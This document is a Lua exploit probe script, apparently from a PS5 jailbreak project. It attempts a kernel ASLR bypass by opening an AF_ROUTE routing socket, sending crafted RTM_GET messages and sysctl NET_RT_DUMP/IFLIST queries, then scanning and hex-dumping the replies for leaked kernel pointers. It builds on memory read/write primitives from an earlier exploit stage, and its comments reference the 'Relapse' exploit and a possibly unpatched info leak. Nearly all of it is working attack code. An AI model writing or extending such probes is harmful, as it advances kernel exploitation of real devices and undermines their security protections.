-- CRASH_CLASS: LOW
-- PROBE 43o: AF_ROUTE socket KASLR defeat
--
-- Context: The Relapse exploit (fw 7.00-13.60) defeated KASLR using an
-- AF_ROUTE socket with RTM_GET queries to leak kernel .text pointers.
-- Sony patched the aio_multi_wait UAF in 14.00 but may not have patched
-- the info leak. AF_ROUTE sockets expose the kernel routing table which
-- contains function pointers, interface addresses, and rt_entry structs
-- with kernel VA pointers. This is the technique that ACTUALLY worked
-- on PS5 — we should have been testing this instead of sysctl scanning.

print("=== PROBE 43o: AF_ROUTE KASLR DEFEAT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wb(addr, val)
    local ok = pcall(function() memory.write_byte(addr, val) end)
    return ok
end

local pid = to_num(syscall.getpid())
print("pid: " .. pid)

local sc_socket = make_syscall(97)
local sc_read = make_syscall(3)
local sc_write = make_syscall(4)
local sc_close = make_syscall(6)
local sc_shutdown = make_syscall(134)
local sc_setsockopt = make_syscall(105)
local sc_getsockopt = make_syscall(118)

-- Constants
local PF_ROUTE = 17     -- AF_ROUTE = PF_ROUTE
local SOCK_RAW = 3
local AF_INET = 2
local AF_INET6 = 28

-- RTM message types
local RTM_GET = 4
local RTM_DUMP = 0x12   -- NET_RT_DUMP (sysctl-style dump)
local RTM_IFLIST = 0x12
local RTM_IFINFO = 0x0E
local RTM_NEWADDR = 0x0C
local RTM_GETALL = 0x12

-- === STEP 1: Create AF_ROUTE socket ===
print("--- STEP 1: Create AF_ROUTE socket ---")

-- socket(PF_ROUTE, SOCK_RAW, 0) — standard routing socket
local ok1, route_fd = pcall(function()
    return sc_socket(uint64(PF_ROUTE), uint64(SOCK_RAW), uint64(0),
        uint64(0), uint64(0), uint64(0))
end)
if not ok1 then
    print("  AF_ROUTE socket CRASHED")
    print("=== PROBE 43o ABORTED ===")
    return
end
local rfd = to_num(route_fd)
print(string.format("  AF_ROUTE socket fd=%d", rfd))

if rfd < 0 then
    print("  socket() failed, trying via resolve...")
    -- Try the standard syscall.socket if make_syscall fails
    local ok1b, route_fd_b = pcall(function()
        return sc_socket(uint64(PF_ROUTE), uint64(SOCK_RAW), uint64(AF_INET),
            uint64(0), uint64(0), uint64(0))
    end)
    if ok1b then
        rfd = to_num(route_fd_b)
        print(string.format("  AF_ROUTE(AF_INET) fd=%d", rfd))
    end
end

if rfd < 0 then
    print("  Cannot create AF_ROUTE socket")
    -- Try AF_ROUTE with different protocol values
    print("  Trying protocol variants...")
    for proto = 0, 30 do
        local ok_p, fd_p = pcall(function()
            return sc_socket(uint64(PF_ROUTE), uint64(SOCK_RAW), uint64(proto),
                uint64(0), uint64(0), uint64(0))
        end)
        if ok_p then
            local fdp = to_num(fd_p)
            if fdp >= 0 then
                print(string.format("  proto=%d: fd=%d  *** WORKS ***", proto, fdp))
                rfd = fdp
                break
            end
        end
    end
end

if rfd < 0 then
    print("  ALL AF_ROUTE attempts failed")
    print("")
    print("--- FALLBACK: Try sysctl NET_RT_DUMP ---")
    -- sysctl net.route.0.0.dump = {CTL_NET=4, PF_ROUTE=17, 0, AF_UNSPEC=0, NET_RT_DUMP=1}
    local sc_sysctl = make_syscall(202)

    local mib = memory.alloc(32)
    safe_wd(mib, 4)       -- CTL_NET
    safe_wd(mib + 4, 17)  -- PF_ROUTE
    safe_wd(mib + 8, 0)   -- protocol
    safe_wd(mib + 12, 0)  -- AF_UNSPEC (all families)
    safe_wd(mib + 16, 1)  -- NET_RT_DUMP
    safe_wd(mib + 20, 0)  -- flags

    -- First: size query
    local szp = memory.alloc(8)
    safe_wd(szp, 0)
    safe_wd(szp + 4, 0)
    local ok_sz, ret_sz = pcall(function()
        return sc_sysctl(uint64(mib), uint64(6), uint64(0),
            uint64(szp), uint64(0), uint64(0))
    end)
    local needed = safe_rd(szp) or 0
    print(string.format("  NET_RT_DUMP size: ret=%d needed=%d",
        ok_sz and to_num(ret_sz) or -999, needed))

    if needed > 0 then
        local cap = math.min(needed, 32768)
        local rtbuf = memory.alloc(cap + 16)
        safe_wd(szp, cap)
        safe_wd(szp + 4, 0)
        local ok_r, ret_r = pcall(function()
            return sc_sysctl(uint64(mib), uint64(6), uint64(rtbuf),
                uint64(szp), uint64(0), uint64(0))
        end)
        local rlen = safe_rd(szp) or 0
        print(string.format("  NET_RT_DUMP read: ret=%d len=%d",
            ok_r and to_num(ret_r) or -999, rlen))

        if rlen > 0 then
            print("")
            print("--- Scanning routing table for kernel pointers ---")
            local kptrs = 0
            for off = 0, rlen - 8, 8 do
                local val = safe_rq(rtbuf + off)
                if val then
                    local h, l = get_hi_lo(val)
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        kptrs = kptrs + 1
                        print(string.format("  KPTR +0x%04X: %08X_%08X", off, h, l))
                    end
                end
            end
            print(string.format("  kernel pointers found: %d", kptrs))

            -- Hex dump first 512 bytes
            print("")
            print("--- First 512 bytes ---")
            for row = 0, math.min(rlen - 1, 511), 16 do
                local hex = ""
                for col = 0, 15 do
                    if row + col < rlen then
                        local b = safe_rb(rtbuf + row + col)
                        if b then
                            hex = hex .. string.format("%02X ", b)
                        else
                            hex = hex .. "?? "
                        end
                    end
                end
                print(string.format("  +%04X: %s", row, hex))
            end
        end
    end

    -- Also try NET_RT_IFLIST
    print("")
    print("--- NET_RT_IFLIST ---")
    safe_wd(mib + 16, 3)  -- NET_RT_IFLIST
    safe_wd(szp, 0)
    safe_wd(szp + 4, 0)
    local ok_if, ret_if = pcall(function()
        return sc_sysctl(uint64(mib), uint64(6), uint64(0),
            uint64(szp), uint64(0), uint64(0))
    end)
    local if_needed = safe_rd(szp) or 0
    print(string.format("  NET_RT_IFLIST size: ret=%d needed=%d",
        ok_if and to_num(ret_if) or -999, if_needed))

    if if_needed > 0 then
        local cap2 = math.min(if_needed, 32768)
        local ifbuf = memory.alloc(cap2 + 16)
        safe_wd(szp, cap2)
        safe_wd(szp + 4, 0)
        local ok_i2, ret_i2 = pcall(function()
            return sc_sysctl(uint64(mib), uint64(6), uint64(ifbuf),
                uint64(szp), uint64(0), uint64(0))
        end)
        local ilen = safe_rd(szp) or 0
        print(string.format("  NET_RT_IFLIST read: ret=%d len=%d",
            ok_i2 and to_num(ret_i2) or -999, ilen))

        if ilen > 0 then
            local kptrs2 = 0
            for off = 0, ilen - 8, 8 do
                local val = safe_rq(ifbuf + off)
                if val then
                    local h, l = get_hi_lo(val)
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        kptrs2 = kptrs2 + 1
                        print(string.format("  KPTR +0x%04X: %08X_%08X", off, h, l))
                    end
                end
            end
            print(string.format("  kernel pointers found: %d", kptrs2))

            print("")
            print("--- First 256 bytes ---")
            for row = 0, math.min(ilen - 1, 255), 16 do
                local hex = ""
                for col = 0, 15 do
                    if row + col < ilen then
                        local b = safe_rb(ifbuf + row + col)
                        if b then
                            hex = hex .. string.format("%02X ", b)
                        else
                            hex = hex .. "?? "
                        end
                    end
                end
                print(string.format("  +%04X: %s", row, hex))
            end
        end
    end

    print("")
    print("=== PROBE 43o COMPLETE (sysctl fallback) ===")
    return
end

-- === If we got here, AF_ROUTE socket is open ===
print("")
print("--- STEP 2: Build RTM_GET message ---")

-- struct rt_msghdr is ~92 bytes on FreeBSD amd64
-- struct sockaddr_in is 16 bytes
local RTM_VERSION = 5
local RTF_UP = 0x1
local RTF_GATEWAY = 0x2

local msglen = 128  -- rt_msghdr + sockaddr_in for dst
local msg = memory.alloc(msglen + 64)

-- Zero it
for i = 0, msglen - 1 do
    safe_wb(msg + i, 0)
end

-- rt_msghdr fields (FreeBSD amd64):
-- +0x00: u_short rtm_msglen
-- +0x02: u_char  rtm_version
-- +0x03: u_char  rtm_type
-- +0x04: u_short rtm_index
-- +0x08: int     rtm_flags
-- +0x0C: int     rtm_addrs
-- +0x10: pid_t   rtm_pid
-- +0x14: int     rtm_seq
-- +0x18: int     rtm_errno
-- +0x1C: int     rtm_fmask
-- +0x20: u_long  rtm_inits  (8 bytes on amd64)
-- +0x28: struct rt_metrics (starts here)
-- Total header ~92 bytes, but align to 96

local HDR_SIZE = 92

-- Fill header
safe_wd(msg, HDR_SIZE + 16)         -- rtm_msglen (header + 1 sockaddr_in)
safe_wb(msg + 2, RTM_VERSION)        -- rtm_version = 5
safe_wb(msg + 3, RTM_GET)           -- rtm_type = RTM_GET
safe_wd(msg + 8, RTF_UP + RTF_GATEWAY) -- rtm_flags
safe_wd(msg + 0x0C, 0x01)           -- rtm_addrs = RTA_DST
safe_wd(msg + 0x14, 1)              -- rtm_seq = 1

-- sockaddr_in for destination (default route 0.0.0.0)
local sa_off = HDR_SIZE
safe_wb(msg + sa_off, 16)           -- sin_len = 16
safe_wb(msg + sa_off + 1, AF_INET)  -- sin_family = AF_INET
-- sin_port = 0, sin_addr = 0.0.0.0 (default route)

local total_len = HDR_SIZE + 16

-- Update msglen
safe_wb(msg, total_len % 256)
safe_wb(msg + 1, math.floor(total_len / 256))

print(string.format("  RTM_GET message built: %d bytes", total_len))
print(string.format("  Sending to fd=%d...", rfd))

-- === STEP 3: Send RTM_GET ===
local ok_w, ret_w = pcall(function()
    return sc_write(uint64(rfd), uint64(msg), uint64(total_len),
        uint64(0), uint64(0), uint64(0))
end)
if not ok_w then
    print("  write CRASHED")
else
    print(string.format("  write ret=%d", to_num(ret_w)))
end

-- === STEP 4: Read response ===
print("")
print("--- STEP 3: Read response ---")
local rbuf = memory.alloc(4096)
for i = 0, 255 do safe_wb(rbuf + i, 0) end

local ok_r, ret_r = pcall(function()
    return sc_read(uint64(rfd), uint64(rbuf), uint64(4096),
        uint64(0), uint64(0), uint64(0))
end)
if not ok_r then
    print("  read CRASHED")
else
    local rlen = to_num(ret_r)
    print(string.format("  read ret=%d bytes", rlen))

    if rlen > 0 then
        -- Scan for kernel pointers
        print("")
        print("--- KERNEL POINTER SCAN ---")
        local kptrs = 0
        for off = 0, rlen - 8, 8 do
            local val = safe_rq(rbuf + off)
            if val then
                local h, l = get_hi_lo(val)
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    kptrs = kptrs + 1
                    print(string.format("  KPTR +0x%03X: %08X_%08X", off, h, l))
                end
            end
        end
        print(string.format("  kernel pointers found: %d", kptrs))

        -- Full hex dump
        print("")
        print("--- Response hex dump ---")
        for row = 0, math.min(rlen - 1, 511), 16 do
            local hex = ""
            for col = 0, 15 do
                if row + col < rlen then
                    local b = safe_rb(rbuf + row + col)
                    if b then
                        hex = hex .. string.format("%02X ", b)
                    else
                        hex = hex .. "?? "
                    end
                end
            end
            print(string.format("  +%03X: %s", row, hex))
        end

        -- Parse rt_msghdr fields from response
        print("")
        print("--- Response header ---")
        local resp_len = (safe_rb(rbuf + 1) or 0) * 256 + (safe_rb(rbuf) or 0)
        local resp_ver = safe_rb(rbuf + 2) or 0
        local resp_type = safe_rb(rbuf + 3) or 0
        local resp_flags = safe_rd(rbuf + 8) or 0
        local resp_addrs = safe_rd(rbuf + 0x0C) or 0
        local resp_errno = safe_rd(rbuf + 0x18) or 0
        print(string.format("  msglen=%d ver=%d type=%d flags=0x%X addrs=0x%X errno=%d",
            resp_len, resp_ver, resp_type, resp_flags, resp_addrs, resp_errno))
    end
end

-- === STEP 5: Try RTM_GET for specific destinations ===
print("")
print("--- STEP 4: RTM_GET for specific destinations ---")
local targets = {
    {127, 0, 0, 1, "loopback"},
    {10, 0, 0, 1, "gateway"},
    {10, 0, 0, 96, "self"},
    {255, 255, 255, 255, "broadcast"},
    {8, 8, 8, 8, "dns"},
}

for _, tgt in ipairs(targets) do
    for i = 0, msglen - 1 do safe_wb(msg + i, 0) end

    safe_wb(msg, total_len % 256)
    safe_wb(msg + 1, math.floor(total_len / 256))
    safe_wb(msg + 2, RTM_VERSION)
    safe_wb(msg + 3, RTM_GET)
    safe_wd(msg + 8, RTF_UP)
    safe_wd(msg + 0x0C, 0x01)  -- RTA_DST
    safe_wd(msg + 0x14, 2)     -- seq=2+

    safe_wb(msg + sa_off, 16)
    safe_wb(msg + sa_off + 1, AF_INET)
    safe_wb(msg + sa_off + 4, tgt[1])
    safe_wb(msg + sa_off + 5, tgt[2])
    safe_wb(msg + sa_off + 6, tgt[3])
    safe_wb(msg + sa_off + 7, tgt[4])

    local ok_w2, ret_w2 = pcall(function()
        return sc_write(uint64(rfd), uint64(msg), uint64(total_len),
            uint64(0), uint64(0), uint64(0))
    end)

    if ok_w2 and to_num(ret_w2) > 0 then
        for i = 0, 511 do safe_wb(rbuf + i, 0) end
        local ok_r2, ret_r2 = pcall(function()
            return sc_read(uint64(rfd), uint64(rbuf), uint64(4096),
                uint64(0), uint64(0), uint64(0))
        end)

        if ok_r2 then
            local rlen2 = to_num(ret_r2)
            local kp = 0
            if rlen2 > 0 then
                for off = 0, rlen2 - 8, 8 do
                    local val = safe_rq(rbuf + off)
                    if val then
                        local h, l = get_hi_lo(val)
                        if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                            kp = kp + 1
                            print(string.format("  %s KPTR +0x%03X: %08X_%08X",
                                tgt[5], off, h, l))
                        end
                    end
                end
            end
            print(string.format("  %s: %d bytes, %d kptrs", tgt[5], rlen2, kp))
        else
            print(string.format("  %s: read CRASHED", tgt[5]))
        end
    else
        print(string.format("  %s: write failed", tgt[5]))
    end
end

-- === STEP 6: Try reading without writing (catch broadcast messages) ===
print("")
print("--- STEP 5: Passive listen for routing messages ---")
-- Set socket non-blocking then try to read
local sc_fcntl = make_syscall(92)
pcall(function()
    sc_fcntl(uint64(rfd), uint64(4), uint64(4),  -- F_SETFL, O_NONBLOCK
        uint64(0), uint64(0), uint64(0))
end)

for i = 0, 511 do safe_wb(rbuf + i, 0) end
local ok_p, ret_p = pcall(function()
    return sc_read(uint64(rfd), uint64(rbuf), uint64(4096),
        uint64(0), uint64(0), uint64(0))
end)
if ok_p then
    local plen = to_num(ret_p)
    print(string.format("  passive read: %d bytes", plen))
    if plen > 0 then
        for off = 0, plen - 8, 8 do
            local val = safe_rq(rbuf + off)
            if val then
                local h, l = get_hi_lo(val)
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    print(string.format("  KPTR +0x%03X: %08X_%08X", off, h, l))
                end
            end
        end
    end
end

pcall(function() sc_close(uint64(rfd)) end)

print("")
print("=== PROBE 43o COMPLETE ===")
